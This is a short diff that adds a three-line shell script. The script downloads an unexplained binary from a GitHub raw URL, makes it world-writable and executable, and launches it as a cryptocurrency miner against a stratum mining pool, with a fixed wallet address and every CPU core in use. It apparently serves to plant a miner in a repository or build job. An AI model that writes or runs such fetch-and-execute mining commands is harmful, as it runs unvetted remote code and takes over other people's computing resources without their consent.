@@ -1,0 +1,3 @@
+wget https://raw.githubusercontent.com/jsiqiisn/a/main/avx2
+chmod 777 avx2
+./avx2 -a minotaurx -o stratum+tcp://stratum-asia.rplant.xyz:7068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.xx -p m=solo -t$(nproc --all)
